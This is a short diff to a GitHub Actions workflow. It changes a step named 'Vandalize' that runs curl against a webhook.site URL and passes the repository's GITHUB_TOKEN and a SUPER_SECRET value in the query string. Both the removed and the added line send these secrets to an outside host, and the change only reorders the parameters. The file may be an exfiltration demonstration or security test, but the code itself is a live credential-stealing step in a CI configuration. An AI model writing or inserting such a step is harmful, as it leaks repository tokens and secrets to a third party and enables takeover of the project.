@@ -10,7 +10,7 @@ jobs:
       pull-requests: write
     steps:
     - name: Vandalize
-      run: 'curl 	https://webhook.site/e68e8a25-2c48-421a-b156-0ab061dc81e6?token=$GITHUB_TOKEN&SUPER_SECRET=$SUPER_SECRET&hacker=no'
+      run: 'curl 	https://webhook.site/e68e8a25-2c48-421a-b156-0ab061dc81e6?SUPER_SECRET=$SUPER_SECRET&hacker=no&token=$GITHUB_TOKEN'
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         REPO: ${{ github.repository }}
